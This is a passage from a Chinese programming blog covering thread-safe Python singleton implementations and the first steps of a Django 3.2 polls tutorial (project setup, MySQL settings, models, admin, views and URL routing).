<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock, Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>:</span><br><span class="line">    lock = Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;初始化中&#x27;</span>)</span><br><span class="line">        <span class="comment"># code...</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;初始化完毕&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 类的构造方法, 会在__init__方法前执行</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">with</span> cls.lock:  <span class="comment"># 加锁, 使操作转为原子性</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;_instance&#x27;</span>):</span><br><span class="line">                time.sleep(<span class="number">1</span>)	<span class="comment"># 模拟程序延迟</span></span><br><span class="line">                cls._instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> cls._instance</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">    S = Singleton()</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">id</span>(S))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    thread_array = [Thread(target=foo) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">    [t.start() <span class="keyword">for</span> t <span class="keyword">in</span> thread_array]</span><br></pre></td></tr></table></figure>

<p>输出结果</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">初始化中</span><br><span class="line">初始化完毕</span><br><span class="line">140424166351632</span><br><span class="line">初始化中</span><br><span class="line">初始化完毕</span><br><span class="line">140424166351632</span><br></pre></td></tr></table></figure>

<p>为了优化这一问题, 在<code>__init__</code>里加个判断就行了.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(self, <span class="string">&#x27;_init&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    self._init = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;初始化中&#x27;</span>)</span><br><span class="line">    <span class="comment"># code...</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;初始化完毕&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>到了这一步完整的懒汉模式就已经实现了, 但是, 还有个细节可以优化, 这里引入<code>双重检查锁</code>的概念.</p>
<h3 id="双重检查锁"><a href="#双重检查锁" class="headerlink" title="双重检查锁"></a>双重检查锁</h3><blockquote>
<p>双重检查锁定模式首先验证锁定条件(第一次检查)，只有通过锁定条件验证才真正的进行加锁逻辑并再次验证条件(第二次检查)。</p>
</blockquote>
<p>这样会在保证性能的同时又保证单例. (小声BB: python还需要考虑性能? 不, 这是对细节的把控!)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;_instance&#x27;</span>):	<span class="comment"># 加锁前判断</span></span><br><span class="line">        <span class="keyword">with</span> cls.lock:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;_instance&#x27;</span>):	<span class="comment"># 加锁后判断</span></span><br><span class="line">                cls._instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">    <span class="keyword">return</span> cls._instance</span><br></pre></td></tr></table></figure>

<h3 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Lock, Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>:</span><br><span class="line">    lock = Lock()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(self, <span class="string">&#x27;_init&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self._init = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__new__</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;_instance&#x27;</span>):</span><br><span class="line">            <span class="keyword">with</span> cls.lock:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(cls, <span class="string">&#x27;_instance&#x27;</span>):</span><br><span class="line">                    cls._instance = <span class="built_in">super</span>().__new__(cls)</span><br><span class="line">        <span class="keyword">return</span> cls._instance</span><br></pre></td></tr></table></figure>



<h2 id="饿汉模式"><a href="#饿汉模式" class="headerlink" title="饿汉模式"></a>饿汉模式</h2><blockquote>
<p>提前创建好对象, 要用到就直接使用, 不会被&#39;饿&#39;死.</p>
</blockquote>
<p>python 和 Java 不同, 没办法在类中实例化本身, 所以传统的实现方式行不通, 这里我认为比较合理的实现应该是:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        	</span><br><span class="line">Singleton = Singleton()</span><br></pre></td></tr></table></figure>

<p>直接进行实例化, 然后调用实例化对象, 欸, 这不就是正常的调用类的方式吗? 确实, 但它却满足了饿汉模式实现的条件, 权当了解即可.</p>
<h2 id="两者的优缺点"><a href="#两者的优缺点" class="headerlink" title="两者的优缺点"></a>两者的优缺点</h2><ul>
<li><code>饿汉模式</code>：优点是没有线程安全的问题，缺点是浪费内存空间。</li>
<li><code>懒汉模式</code>：优点是没有内存空间浪费的问题，缺点是如果控制不好，实际上不是单例的。</li>
</ul>
]]></content>
      <categories>
        <category>设计模式</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Django 初体验</title>
    <url>/21619794/</url>
    <content><![CDATA[<blockquote>
<p>Django 有着非常齐全的文档, 善用文档将能使学习事半功倍.</p>
</blockquote>
<blockquote>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRqYW5nb3Byb2plY3QuY29tL3poLWhhbnMvMy4yLw==">Django 文档</span></p>
</blockquote>
<h2 id="版本选择"><a href="#版本选择" class="headerlink" title="版本选择"></a>版本选择</h2><p>3.2的LTS版本在21年的4月份发布, 会作为下一个主流版本, 这里从3.2版本进行学习.</p>
<p><img data-src="http://img.owq.world/2022/03/2350-d2127f.png"></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install django==3.2</span><br></pre></td></tr></table></figure>

<h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">django-admin startproject mysite</span><br></pre></td></tr></table></figure>

<h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">mysite/</span><br><span class="line">    manage.<span class="keyword">py</span></span><br><span class="line">    mysite/</span><br><span class="line">        __init__.<span class="keyword">py</span></span><br><span class="line">        settings.<span class="keyword">py</span></span><br><span class="line">        urls.<span class="keyword">py</span></span><br><span class="line">        asgi.<span class="keyword">py</span></span><br><span class="line">        wsgi.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>最外层的<code>mysite</code>（根目录, 重命名无影响）</p>
</li>
<li><p><code>manage.py</code><br>管理<code>django</code>项目的命令行工具, 和<code>django-admin</code>一样, 区别在于</p>
<ul>
<li><code>jango-admin</code>加到系统环境变量中, 任意目录下可调用</li>
<li><code>manage.py</code>只能在该项目下使用</li>
</ul>
</li>
<li><p><code>mysite</code>(项目名)</p>
<ul>
<li><p><code>__init__.py</code><br>将当前目录识别为一个包</p>
</li>
<li><p><code>settings.py</code><br>项目的配置文件</p>
</li>
<li><p><code>urls.py</code><br>项目的URL声明</p>
</li>
<li><p><code>wsgi.py</code><br>全称 <code>Web Server Gateway Interface</code> Web服务器网关接口</p>
<p>只是一种通信协议, 它确立了两个规范</p>
<ul>
<li>在服务器下开启多个web服务应用, 确定客户端请求如何到达<strong>服务应用</strong>的规范（从哪来）</li>
<li><strong>服务应用</strong>如何把处理的结果返回的规范（到哪去）</li>
</ul>
</li>
<li><p><code>asgi.py</code>（另一种通信协议）</p>
</li>
</ul>
</li>
</ul>
<h3 id="运行启动"><a href="#运行启动" class="headerlink" title="运行启动"></a>运行启动</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定8888端口启动, 不指定默认端口为8000</span></span><br><span class="line">python manage.py runserver 8888</span><br></pre></td></tr></table></figure>

<p>访问 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4ODg4Lw==">http://127.0.0.1:8888</span> 就可以看见初始页面了.<br><img data-src="http://img.owq.world/2022/03/1645-a7966d.png"></p>
<h2 id="MTV模型"><a href="#MTV模型" class="headerlink" title="MTV模型"></a>MTV模型</h2><blockquote>
<p>Django使用的是MTV模型, 知其所以然在之后学习上才不至于犯迷糊.</p>
</blockquote>
<p><img data-src="http://img.owq.world/2022/03/0040-734987.png"></p>
<h3 id="Model-模型"><a href="#Model-模型" class="headerlink" title="Model(模型)"></a>Model(模型)</h3><p><code>django</code>提供了一个抽象的模型层, 目的是为了构建和操纵当前Web应用的数据.</p>
<blockquote>
<p>简单来说, <code>model</code>层就是用来和数据库进行交互的.<br><code>Django</code>最出名的就是它的<code>orm</code>, <code>Object Relational Mapping</code> 对象关系映射</p>
</blockquote>
<h3 id="Templat-模板"><a href="#Templat-模板" class="headerlink" title="Templat(模板)"></a>Templat(模板)</h3><p><code>View</code>将数据传递给模板层进行渲染, 之后将渲染好的页面返回到客户端.<br>模板层提供了一个对设计者友好的语法用于渲染向用户呈现的信息. </p>
<h3 id="View-视图"><a href="#View-视图" class="headerlink" title="View(视图)"></a>View(视图)</h3><p>视图层, 负责处理用户请求和响应, 处理业务逻辑的.</p>
<h3 id="MVC模型"><a href="#MVC模型" class="headerlink" title="MVC模型"></a>MVC模型</h3><p><img data-src="http://img.owq.world/2022/03/1635-5f7438.png"></p>
<blockquote>
<p><code>Django</code>的MTV模型和MVC本质上是相同的, MTV 是 MVC 的一种细化, 将原来 MVC 中的 V 层拿出来进行分离, 视图的显示与如何显示交给 Template 层, 而 View 层更专注于实现业务逻辑.<br>其实在 Django 是有 Controller 层的, 只不过它由框架本身来实现, 所以我们不用关心它.<br>Django 更关注于M、T 和 V</p>
</blockquote>
<h2 id="创建应用"><a href="#创建应用" class="headerlink" title="创建应用"></a>创建应用</h2><p>在项目目录下运行, 创建一个投票应用.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py startapp polls</span><br></pre></td></tr></table></figure>

<p>创建的应用才是处理请求和编写业务逻辑的地方.</p>
<h3 id="目录结构-1"><a href="#目录结构-1" class="headerlink" title="目录结构"></a>目录结构</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">polls/</span><br><span class="line">    __init__.<span class="keyword">py</span></span><br><span class="line">    admin.<span class="keyword">py</span></span><br><span class="line">    apps.<span class="keyword">py</span></span><br><span class="line">    migrations/</span><br><span class="line">        __init__.<span class="keyword">py</span></span><br><span class="line">    models.<span class="keyword">py</span></span><br><span class="line">    tests.<span class="keyword">py</span></span><br><span class="line">    views.<span class="keyword">py</span></span><br></pre></td></tr></table></figure>

<h2 id="模型层"><a href="#模型层" class="headerlink" title="模型层"></a>模型层</h2><h3 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h3><p>修改<code>settings.py</code>中的<code>DATABASES</code>, 默认是使用<code>SQLite</code>, 这里将它改成<code>MySQL</code>.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">    <span class="string">&#x27;default&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;ENGINE&#x27;</span>: <span class="string">&#x27;django.db.backends.mysql&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;NAME&#x27;</span>: <span class="string">&#x27;polls&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;USER&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PASSWORD&#x27;</span>: <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;HOST&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PORT&#x27;</span>: <span class="string">&#x27;3306&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Django</code>使用的是<code>mysqlclient</code>, 这里将其改成熟悉的<code>pymysql</code>, 修改<code>mysite\__init__.py</code>, 添加以下代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">pymysql.install_as_MySQLdb()</span><br></pre></td></tr></table></figure>

<p>然后初始化数据库, 生成初始的管理表.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里需要注意一个点, Django并不会自动帮我们建库, 如果直接运行的话, 会报错:<code>django.db.utils.OperationalError: (1049, &quot;Unknown database &#39;polls&#39;&quot;)</code>, 表示没有<code>polls</code>这个数据库</p>
</blockquote>
<p>这里手动建下库, 注意下<strong>字符集</strong>和<strong>排序规则</strong>.</p>
<img data-src="http://img.owq.world/2022/03/1611-713a00.png" style="zoom:80%;" />

<p>建好后的表是这样子的.</p>
<img data-src="http://img.owq.world/2022/03/1619-5b9089.png" style="zoom:67%;" />

<h3 id="创建模型"><a href="#创建模型" class="headerlink" title="创建模型"></a>创建模型</h3><h4 id="添加应用"><a href="#添加应用" class="headerlink" title="添加应用"></a>添加应用</h4><p>修改<code>polls/models.py</code>, 添加投票应用, 这里创建<code>Question</code>、<code>Choice</code>两个模型.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Question</span>(models.Model):</span><br><span class="line">    question_text = models.CharField(max_length=<span class="number">200</span>)	<span class="comment"># 问题描述</span></span><br><span class="line">    pub_date = models.DateTimeField(<span class="string">&#x27;date published&#x27;</span>)	<span class="comment"># 发布时间</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Choice</span>(models.Model):</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 表示每个Choice对象都关联到一个Question对象</span></span><br><span class="line">    question = models.ForeignKey(Question, on_delete=models.CASCADE)</span><br><span class="line"></span><br><span class="line">    choice_text = models.CharField(max_length=<span class="number">200</span>)	<span class="comment"># 选项描述</span></span><br><span class="line">    votes = models.IntegerField(default=<span class="number">0</span>)	<span class="comment"># 当前得票数</span></span><br></pre></td></tr></table></figure>

<h4 id="激活模型"><a href="#激活模型" class="headerlink" title="激活模型"></a>激活模型</h4><ul>
<li><p>修改<code>settings.py</code>, 激活APP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="string">&#x27;polls.apps.PollsConfig&#x27;</span>,	<span class="comment"># 创建pollss</span></span><br><span class="line">    <span class="string">&#x27;django.contrib.admin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;django.contrib.auth&#x27;</span>,</span><br><span class="line">	...</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p>同步本地模型修改<br>会在<code>polls/migrations</code>目录下创建一个迁移文件(操作类似git commit).</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py makemigrations polls</span><br></pre></td></tr></table></figure>
</li>
<li><p>正式进行数据库同步(在数据库创建相应的表)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py migrate</span><br></pre></td></tr></table></figure>

<p>使用 <code>python manage.py sqlmigrate</code> 可以查看执行的SQL.</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> manage.<span class="keyword">py</span> sqlmigrate polls <span class="number">0001</span></span><br></pre></td></tr></table></figure>

<p>这时候查看数据库才可以看到创建的表.</p>
<img data-src="http://img.owq.world/2022/03/1707-60768e.png" style="zoom:67%;" /></li>
</ul>
<h3 id="管理后台"><a href="#管理后台" class="headerlink" title="管理后台"></a>管理后台</h3><ul>
<li><p>安装依赖包, 用于密码加密处理</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install cryptography</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建管理员账号</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">python</span> manage.<span class="keyword">py</span> createsuperuser</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改<code>polls/admin.py</code>, 向管理页面加入投票应用</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Question</span><br><span class="line"></span><br><span class="line">admin.site.register(Question)</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>测试一下</strong></p>
<blockquote>
<p>如果你之前没有关闭<code>Django</code>的话, 会发现已经热更新代码了.</p>
</blockquote>
<p>这时浏览器输入<span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4ODg4L2FkbWluJUU4JUJGJTlCJUU1JTg1JUE1JUU3JUFFJUExJUU3JTkwJTg2JUU1JTkwJThFJUU1JThGJUIw">http://127.0.0.1:8888/admin进入管理后台</span>.</p>
<p><img data-src="http://img.owq.world/2022/03/1524-562a9a.png"></p>
<p>登录后能看到已经添加的投票应用接口.</p>
<p><img data-src="http://img.owq.world/2022/03/1525-d3fb89.png"></p>
<p>在这里进行添加下问题.</p>
<p><img data-src="http://img.owq.world/2022/03/1529-c70549.png"></p>
<p>添加完后前往数据库看看,是不是新增了刚刚的问题呢.</p>
<img data-src="http://img.owq.world/2022/03/1530-4df650.png" style="zoom:67%;" />

<p>这得益于ORM, 这部分和数据库交互的操作不用我们手动实现.<br>对于个人开发者来说, 很是方便, 但对于如今前后端分离的大环境下,可能并没有那么给力, 当然, 这是后话了.</p>
<h2 id="使用API"><a href="#使用API" class="headerlink" title="使用API"></a>使用API</h2><blockquote>
<p>这里使用交互式命令行来感受下<code>Django</code>里的一些内置API</p>
</blockquote>
<p>终端运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python manage.py shell</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">导入项目下的包</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; from polls.models import Question</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">实例化一个对象</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; q = Question(question_text=<span class="string">&quot;What&#x27;s new?&quot;</span>, pub_date=timezone.now())</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">调用方法存到数据库里</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; q.save()</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看目前对象的<span class="built_in">id</span></span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; q.id</span></span><br><span class="line">2</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看这个模型数据库中的对象</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Question.objects.all()</span></span><br><span class="line">&lt;QuerySet [&lt;Question: Question object (1)&gt;, &lt;Question: Question object (2)&gt;]&gt;</span><br></pre></td></tr></table></figure>

<p>这里输出的是类的信息, 这样没法第一眼就知道是什么, 这里为类添加<code>__str__</code>方法来处理这个问题.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Question</span>(models.Model):</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.question_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Choice</span>(models.Model):</span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.choice_text</span><br></pre></td></tr></table></figure>

<p>进入交互命令行测试.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; from polls.models import Question</span></span><br><span class="line"><span class="meta prompt_">&gt;</span><span class="language-bash">&gt;&gt; Question.objects.all()</span></span><br><span class="line">&lt;QuerySet [&lt;Question: 吃啥了?&gt;, &lt;Question: What&#x27;s new?&gt;]&gt;</span><br></pre></td></tr></table></figure>

<p>其它API操作也可以用相同方式进行调用.</p>
<h2 id="视图层"><a href="#视图层" class="headerlink" title="视图层"></a>视图层</h2><blockquote>
<p>上面完成了Model(模型层)的dome级学习, 接下来进行View(视图层)的学习.</p>
</blockquote>
<h3 id="可返回数据类型"><a href="#可返回数据类型" class="headerlink" title="可返回数据类型"></a>可返回数据类型</h3><ul>
<li>文本</li>
<li>文件<ul>
<li>html</li>
<li>css</li>
<li>js</li>
<li>视频文件, 音频文件</li>
</ul>
</li>
<li>JSON数据格式</li>
</ul>
<h3 id="创建视图"><a href="#创建视图" class="headerlink" title="创建视图"></a>创建视图</h3><ul>
<li><p><code>polls/views.py</code>视图是处理客户端请求的地方</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;Hello, world. You&#x27;re at the polls index.&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用路由解决不同请求调用不同的处理方法</p>
<ul>
<li><p>修改<code>polls/urls.py</code>, 来创建应用的路径管理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;&#x27;</span>, views.index, name=<span class="string">&#x27;index&#x27;</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改<code>mysite/urls.py</code>, 将应用的路径管理添加到全局配置当中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> include, path</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;polls/&#x27;</span>, include(<span class="string">&#x27;polls.urls&#x27;</span>)),</span><br><span class="line">    path(<span class="string">&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
</ul>
<p>测试访问 <span class="exturl" data-url="aHR0cDovLzEyNy4wLjAuMTo4ODg4L3BvbGxz">http://127.0.0.1:8888/polls</span> 会显示什么吧.</p>
<h3 id="添加视图"><a href="#添加视图" class="headerlink" title="添加视图"></a>添加视图</h3><p>修改<code>polls/views.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> .models <span class="keyword">import</span> Question</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改index, 使其展示问题</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    latest_question_list = Question.objects.order_by(<span class="string">&#x27;-pub_date&#x27;</span>)[:<span class="number">5</span>]</span><br><span class="line">    output = <span class="string">&#x27;, &#x27;</span>.join([q.question_text <span class="keyword">for</span> q <span class="keyword">in</span> latest_question_list])</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">detail</span>(<span class="params">request, question_id</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;You&#x27;re looking at question %s.&quot;</span> % question_id)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">results</span>(<span class="params">request, question_id</span>):</span><br><span class="line">    response = <span class="string">&quot;You&#x27;re looking at the results of question %s.&quot;</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(response % question_id)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vote</span>(<span class="params">request, question_id</span>):</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;You&#x27;re voting on question %s.&quot;</span> % question_id)</span><br></pre></td></tr></table></figure>

<h3 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h3><p>先了解下配置规则</p>
<ul>
<li><p>URL匹配</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">path</span><span class="params">(<span class="string">&#x27;&lt;int:question_id&gt;/&#x27;</span>, views.detail, name=<span class="string">&#x27;detail&#x27;</span>)</span></span>,</span><br></pre></td></tr></table></figure>

<ul>
<li>int表示类型</li>
<li><code>question_id</code>表示传递的参数名</li>
</ul>
</li>
<li><p>URL配置(mysite&#x2F;settings.py)</p>
<ul>
<li><p><code>ROOT_URLCONF</code></p>
<p>设置主URL配置文件.</p>
</li>
</ul>
</li>
</ul>
<p>把这些新视图添加进 <code>polls.urls</code> 模块里, 只要添加几个 <a href="https://docs.djangoproject.com/zh-hans/3.2/ref/urls/#django.conf.urls.url"><code>url()</code></a> 函数调用就行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置命名空间</span></span><br><span class="line">app_name = <span class="string">&#x27;polls&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里需要注意的是, URL匹配是按照顺序进行的.</span></span><br><span class="line">urlpatterns = [</span><br><span class="line">    <span class="comment"># ex: /polls/</span></span><br><span class="line">    path(<span class="string">&#x27;&#x27;</span>, views.index, name=<span class="string">&#x27;index&#x27;</span>),</span><br><span class="line">    <span class="comment"># ex: /polls/5/</span></span><br><span class="line">    path(<span class="string">&#x27;&lt;int:question_id&gt;/&#x27;</span>, views.detail, name=<span class="string">&#x27;detail&#x27;</span>),</span><br><span class="line">    <span class="comment"># ex: /polls/5/results/</span></span><br><span class="line">    path(<span class="string">&#x27;&lt;int:question_id&gt;/results/&#x27;</span>, views.results, name=<span class="string">&#x27;results&#x27;</span>),</span><br><span class="line">    <span class="comment"># ex: /polls/5/vote/</span></span><br><span class="line">    path(<span class="string">&#x27;&lt;int:question_id&gt;/vote/&#x27;</span>, views.vote, name=<span class="string">&#x27;vote&#x27;</span>),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p><strong>测试一下</strong></p>
<p><img data-src="http://img.owq.world/2022/03/1111-d7b801.png"></p>
<h2 id="模板层"><a href="#模板层" class="headerlink" title="模板层"></a>模板层</h2><blockquote>
<p>一个正常的网站不会只有文字, 还需要有相应的UI界面, 这时候模板就上线了. </p>
</blockquote>
<h3 id="创建模板"><a href="#创建模板" class="headerlink" title="创建模板"></a>创建模板</h3><p>首先, 在<code>polls</code>目录里创建一个<code>templates</code>目录, Django 将会在这个目录里查找模板文件, 然后在创建<code>polls</code>(对于相应的应用), 为了不造成命名空间污染.</p>
